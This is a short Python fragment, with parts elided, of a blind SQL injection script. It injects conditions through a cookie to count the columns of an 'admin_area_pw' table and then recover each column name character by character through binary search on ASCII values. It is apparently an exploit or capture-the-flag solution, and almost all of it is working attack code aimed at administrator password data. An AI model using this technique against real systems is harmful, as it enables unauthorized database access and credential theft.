...
for i in range(1,400):
	try:
		db_cookie="1 and (select count(column_name) from information_schema.columns where table_name='admin_area_pw')="+str(i)
		...
		while True:
			try:
				if maximum<33 or minimum > 128:
					break
				k = (minimum+maximum)//2
				db_cookie="1 and ascii(substring((select column_name from information_schema.columns where column_name like '%' and table_name='admin_area_pw' limit "+str(i)+", 1),"+str(j)+",1))<"+str(k)
